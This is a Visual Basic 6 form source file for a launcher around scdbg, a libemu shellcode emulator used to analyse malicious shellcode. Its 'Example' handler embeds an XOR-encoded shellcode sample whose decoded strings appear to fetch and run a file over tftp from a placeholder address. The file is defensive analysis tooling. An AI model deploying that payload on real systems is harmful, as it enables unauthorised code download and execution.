VERSION 5.00
Begin VB.Form frmScTest 
   Caption         =   "scDbg - libemu Shellcode Logger Launch Interface"
   ClientHeight    =   7170
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   10140
   LinkTopic       =   "Form3"
   ScaleHeight     =   7170
   ScaleWidth      =   10140
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   5280
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Top             =   1845
      Width           =   9960
   End
   Begin VB.Frame Frame1 
      Caption         =   "Options"
      Height          =   1815
      Left            =   60
      TabIndex        =   0
      Top             =   0
      Width           =   10005
      Begin VB.TextBox txtManualArgs 
         Height          =   285
         Left            =   1800
         TabIndex        =   25
         Top             =   1080
         Width           =   5955
      End
      Begin VB.TextBox txtStartOffset 
         Height          =   285
         Left            =   8055
         TabIndex        =   22
         Text            =   "0"
         Top             =   180
         Width           =   675
      End
      Begin VB.CheckBox chkOffset 
         Caption         =   "Start Offset  0x"
         Height          =   255
         Left            =   6660
         TabIndex        =   23
         Top             =   195
         Width           =   1515
      End
      Begin VB.CommandButton cmdrowse 
         Caption         =   "..."
         Height          =   285
         Left            =   7830
         TabIndex        =   21
         Top             =   675
         Width           =   465
      End
      Begin VB.TextBox txtFopen 
         Height          =   285
         Left            =   1035
         OLEDropMode     =   1  'Manual
         TabIndex        =   20
         Top             =   675
         Width           =   6720
      End
      Begin VB.CheckBox chkfopen 
         Caption         =   "fopen"
         Height          =   240
         Left            =   225
         TabIndex        =   19
         Top             =   720
         Width           =   1230
      End
      Begin VB.CheckBox ChkMemMon 
         Caption         =   "Monitor DLL Read/Write"
         Height          =   195
         Left            =   5640
         TabIndex        =   18
         Top             =   480
         Width           =   2295
      End
      Begin VB.CheckBox chkFindSc 
         Caption         =   "FindSc"
         Height          =   255
         Left            =   5640
         TabIndex        =   17
         Top             =   180
         Width           =   1095
      End
      Begin VB.CheckBox chkDebugShell 
         Caption         =   "Debug Shell"
         Height          =   195
         Left            =   4080
         TabIndex        =   16
         Top             =   480
         Width           =   1455
      End
      Begin VB.CheckBox chkUnlimitedSteps 
         Caption         =   "Unlimited steps"
         Height          =   255
         Left            =   4080
         TabIndex        =   15
         Top             =   180
         Width           =   1635
      End
      Begin VB.CheckBox chkAdjustOffsets 
         Caption         =   "Show File based offsets"
         Enabled         =   0   'False
         Height          =   195
         Left            =   1920
         TabIndex        =   9
         Top             =   180
         Width           =   1995
      End
      Begin VB.CheckBox chkInteractiveHooks 
         Caption         =   "Use Interactive Hooks"
         Height          =   255
         Left            =   1920
         TabIndex        =   8
         Top             =   420
         Width           =   1935
      End
      Begin VB.CheckBox chkCreateDump 
         Caption         =   "Create Dump"
         Height          =   255
         Left            =   240
         TabIndex        =   7
         Top             =   420
         Width           =   1455
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Launch"
         Height          =   375
         Left            =   8370
         TabIndex        =   2
         Top             =   1035
         Width           =   1575
      End
      Begin VB.CheckBox chkReport 
         Caption         =   "Report Mode"
         Height          =   255
         Left            =   240
         TabIndex        =   1
         Top             =   180
         Width           =   1695
      End
      Begin VB.Label Label1 
         Caption         =   "Manual  Arguments"
         Height          =   285
         Left            =   225
         TabIndex        =   24
         Top             =   1080
         Width           =   1410
      End
      Begin VB.Label Label6 
         Caption         =   "scdbg homepage"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Index           =   8
         Left            =   3480
         TabIndex        =   14
         Top             =   1440
         Width           =   1335
      End
      Begin VB.Label Label6 
         Caption         =   "cmdline"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Index           =   7
         Left            =   4860
         TabIndex        =   13
         Top             =   1440
         Width           =   675
      End
      Begin VB.Label Label6 
         Caption         =   "Save dump"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Index           =   0
         Left            =   8190
         TabIndex        =   12
         Top             =   1440
         Width           =   855
      End
      Begin VB.Label Label6 
         Caption         =   "Video Demo"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Index           =   2
         Left            =   5580
         TabIndex        =   11
         Top             =   1440
         Width           =   1035
      End
      Begin VB.Label Label6 
         Caption         =   "Help"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   195
         Index           =   6
         Left            =   6660
         TabIndex        =   10
         Top             =   1440
         Width           =   375
      End
      Begin VB.Label Label6 
         Caption         =   "Libemu HomePage"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Index           =   4
         Left            =   1860
         TabIndex        =   6
         Top             =   1440
         Width           =   1455
      End
      Begin VB.Label Label6 
         Caption         =   "Manually Load File"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Index           =   3
         Left            =   240
         TabIndex        =   5
         Top             =   1440
         Width           =   1335
      End
      Begin VB.Label Label6 
         Caption         =   "Example"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Index           =   5
         Left            =   7335
         TabIndex        =   4
         Top             =   1440
         Width           =   735
      End
   End
End
Attribute VB_Name = "frmScTest"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim b() As Byte
Dim dlg As New clsCmnDlg
Dim scfile As String
Dim sctest As String
Dim lastcmdline As String

'Private Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
'Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
'Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
'Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
'Private Const SYNCHRONIZE = &H100000
'Private Const INFINITE = &HFFFF

Const INFINITE = &HFFFF
Const STARTF_USESHOWWINDOW = &H1
Private Enum enSW
    SW_HIDE = 0
    SW_NORMAL = 1
    SW_MAXIMIZE = 3
    SW_MINIMIZE = 6
End Enum

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Byte
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Enum enPriority_Class
    NORMAL_PRIORITY_CLASS = &H20
    IDLE_PRIORITY_CLASS = &H40
    HIGH_PRIORITY_CLASS = &H80
End Enum

Private Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As SECURITY_ATTRIBUTES, lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long

Private Function SuperShell(ByVal App As String, ByVal WorkDir As String, Optional wait As Boolean = False, Optional dwMilliseconds As Long = 0, Optional start_size As enSW = SW_NORMAL, Optional Priority_Class As enPriority_Class = NORMAL_PRIORITY_CLASS) As Boolean

        Dim pclass As Long
        Dim sinfo As STARTUPINFO
        Dim pinfo As PROCESS_INFORMATION
        Dim sec1 As SECURITY_ATTRIBUTES
        Dim sec2 As SECURITY_ATTRIBUTES
        sec1.nLength = Len(sec1)
        sec2.nLength = Len(sec2)
        sinfo.cb = Len(sinfo)
        sinfo.dwFlags = STARTF_USESHOWWINDOW
        sinfo.wShowWindow = start_size
        pclass = Priority_Class
        
        If CreateProcess(vbNullString, App, sec1, sec2, False, pclass, 0&, WorkDir, sinfo, pinfo) Then
            If wait Then WaitForSingleObject pinfo.hProcess, dwMilliseconds
            SuperShell = True
        Else
            SuperShell = False
        End If
        
End Function


'file msut exist for this to work which is stupid...
Public Function GetShortName(sFile As String) As String
    Dim sShortFile As String * 67
    Dim lResult As Long

    'Make a call to the GetShortPathName API
    lResult = GetShortPathName(sFile, sShortFile, _
    Len(sShortFile))

    'Trim out unused characters from the string.
    GetShortName = Left$(sShortFile, lResult)

End Function

Public Function InitInterface(Optional Shellcode = Empty)
       
    scfile = Empty
    
    If Not checkFor_sctest() Then Command1.enabled = False
    
    If Len(Shellcode) = 0 Then
        Text1 = "No text selected! you can use demo link."
    Else
        Text1 = HexDump(Shellcode)
        b() = StrConv(Shellcode, vbFromUnicode, LANG_US)
    End If
    
    Me.Visible = True
    
    
End Function

Function checkFor_sctest() As Boolean
        
        sctest = App.path & "\libemu\scdbg.exe"
        If Not fso.FileExists(sctest) Then
            MsgBox "Can not find scdbg? Should be distributed with installer?"
        Else
            checkFor_sctest = True
        End If
        
End Function


Private Sub cmdrowse_Click()
    txtFopen.Text = dlg.OpenDialog(AllFiles)
End Sub

Private Sub Command1_Click()
    
    On Error Resume Next
    
    scfile = App.path & "\libemu\sample.sc"
    
    If fso.FileExists(scfile) Then Kill scfile
    fso.writeFile scfile, StrConv(b(), vbUnicode, LANG_US)

    sctest = App.path & "\libemu\scdbg.exe"
    If Not fso.FileExists(sctest) Then
        MsgBox "Can not find sctest in app.path exiting", vbCritical
        Exit Sub
    End If
   
    Dim cmdline As String
    Dim graphpth As String
    
    scfile = Trim(Replace(scfile, Chr(0), Empty))
    cmdline = GetShortName(sctest)
    libemu = GetShortName(App.path & "\libemu")
    
    If chkAdjustOffsets.Value = 1 Then cmdline = cmdline & " -a"
    If chkInteractiveHooks.Value = 1 Then cmdline = cmdline & " -i"
    If chkCreateDump.Value = 1 Then cmdline = cmdline & " -d"
    If chkReport.Value = 1 Then cmdline = cmdline & " -r"
    If chkUnlimitedSteps.Value = 1 Then cmdline = cmdline & " -s -1"
    If chkDebugShell.Value = 1 Then cmdline = cmdline & " -vvv"
    If chkFindSc.Value = 1 Then cmdline = cmdline & " -findsc"
    If ChkMemMon.Value = 1 Then cmdline = cmdline & " -mdll"
    
    If chkOffset.Value = 1 Then
        If Not isHexNum(txtStartOffset) Then
            MsgBox "Start offset is not a valid hex number: " & txtStartOffset, vbInformation
            Exit Sub
        End If
        cmdline = cmdline & " -foff " & txtStartOffset
    End If
    
    If chkfopen.Value = 1 Then
        If Not fso.FileExists(txtFopen.Text) Then
            MsgBox "You must specify a valid file to open", vbInformation
            Exit Sub
        End If
        cmdline = cmdline & " -fopen " & GetShortName(txtFopen)
    End If
                                
    cmdline = cmdline & " -f sample.sc" & " " & txtManualArgs
    
    cmdline = "cmd /k chdir /d " & libemu & "\ && " & cmdline
    lastcmdline = cmdline
    
    pid = Shell(cmdline, vbNormalFocus)
    
    'If chkGraph.Value = 1 And fso.FileExists("c:\sc_graph.dot") Then
    '    graphpth = dlg.SaveDialog(AllFiles, RecommendedPath(), "Save Graph as", , Me.hwnd, RecommendedName(".gv"))
    '    If Len(graphpth) <> 0 Then
    '        If fso.FileExists(graphpth) Then Kill graphpth
    '        x = fso.ReadFile("c:\sc_graph.dot")
    '        fso.WriteFile graphpth, x
    '    End If
    '    fso.DeleteFile "c:\sc_graph.dot"
    'End If
    
End Sub

Private Function RecommendedPath() As String
    On Error Resume Next
    RecommendedPath = fso.GetParentFolder(Form1.txtPDFPath)
End Function

Private Function RecommendedName(Optional ext = ".sc") As String
    
    On Error Resume Next
    Dim r As String
    
    If Form1.txtPDFPath <> "Drag and drop pdf file here" Then
        r = fso.GetBaseName(Form1.txtPDFPath)
    End If
    
    'old extension was .gv
    If Len(r) = 0 Then
        If ext = ".sc" Then r = "bytes.sc" Else r = "graph" & ext
    Else
        r = r & ext
    End If
    RecommendedName = r
    
End Function
    

Private Sub Form_Load()
'    cbo.AddItem "0 - api hooks"
'    cbo.AddItem "1 + disasm"
'    cbo.AddItem "2 + registers"
'    cbo.AddItem "3 + dbg shell"
    'cbo.AddItem "4 + stack "'
    'cbo.ListIndex = 0
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    Kill App.path & "\libemu\sample.unpack"
    Kill App.path & "\libemu\graph.dot"
End Sub


Private Sub Label6_Click(Index As Integer)
    On Error Resume Next
     
    cap = Label6(Index).Caption
    
    If InStr(cap, "Help") > 0 Then
        Shell "cmd /k mode con lines=45 cols=100 && """ & App.path & "\libemu\scdbg.exe"" -h", vbNormalFocus
    End If
    
    If InStr(cap, "Home") > 0 Then
        Shell "cmd /c start http://libemu.carnivore.it/"
    End If
    
    If InStr(cap, "Manual") > 0 Then
        f = dlg.OpenDialog(AllFiles, , "Manually load shellcode file", Me.hwnd)
        If Len(f) = 0 Then Exit Sub
        InitInterface fso.ReadFile(f)
    End If
    
    If InStr(cap, "Example") > 0 Then
        x = unescape("%90%90%EB%02%EB%05%E8%F9%FF%FF%FF%5B%31%C9%B1%E0%80%73%0C%12%43%E2%F9%21%D2%76%11%52%22%6A%1E%99%52%1E%99%62%0E%BF%99%52%1A%F9%1B%99%52%26%9F%52%6E%99%52%2E%99%C2%11%52%2E%99%D8%11%5A%6A%99%53%32%99%C8%11%4B%0E%21%ED%21%E4%45%45%99%D8%11%1E%%02%93%6B%18%77%61%61%53%67%10%99%21%93%6B%11%66%46%7A%60%67%10%99%29%91%D2%16%91%D1%16%97%E4%66%C9%97%ED%66%C5%11%E0%11%E8%45%FA%37%12%12%12%66%74%66%62%3C%77%6A%77%32%3F%7B%32%22%3C%22%3C%22%3C%22%32%75%77%66%32%65%7B%7C%73%62%7B%21%20%3C%77%6A%77%12%78%12%FA%31%12%12%12%67%13%D1%FA%1F%12%12%12%65%7B%7C%73%62%7B%21%20%3C%77%6A%77%12%78%12%FA%15%12%12%12%1D%96%F3%ED%ED%ED%D1%4A%49%4F%42%91%FE%46%21%D2%99%EE%9F%5A%52%99%C5%E1%B8%A2%56%B9%45%40%43%43%78%3A%78%13%43%43%47%41%ED%C4%91%D6%46%97%D2%D1%5C%00%43%00%24%00%5C%00%31%00%32%00%33%00%34%00%35%00%36%00")
        Me.InitInterface x
    End If
    
    If InStr(cap, "Demo") > 0 Then
        Shell "cmd /c start http://www.youtube.com/watch?v=jFkegwFasIw"
    End If
    
    If InStr(cap, "scdbg") > 0 Then
        Shell "cmd /c start http://sandsprite.com/blogs/index.php?uid=7&pid=152"
    End If
    
    dump = App.path & "\libemu\sample.unpack"
    If InStr(1, cap, "dump", 1) > 0 Then
        If Not fso.FileExists(dump) Then
            MsgBox "No dump file found. Maybe no changes were detected.", vbInformation
        Else
            pth = dlg.SaveDialog(AllFiles, , "Save dump as", , Me.hwnd, RecommendedName())
            If Len(pth) = 0 Then Exit Sub
            FileCopy dump, pth
        End If
    End If
    
    graph = App.path & "\libemu\graph.dot"
    If InStr(1, cap, "graph", 1) > 0 Then
        If Not fso.FileExists(graph) Then
            MsgBox "No graph file found", vbInformation
        Else
            pth = dlg.SaveDialog(AllFiles, , "Save graph as", , Me.hwnd, RecommendedName(".dot"))
            If Len(pth) = 0 Then Exit Sub
            FileCopy graph, pth
        End If
    End If
    
    If InStr(1, cap, "cmdline", 1) > 0 Then
        Clipboard.Clear
        Clipboard.SetText lastcmdline
        MsgBox Len(lastcmdline) & " bytes copied to clipboard", vbInformation
    End If
    
    
End Sub
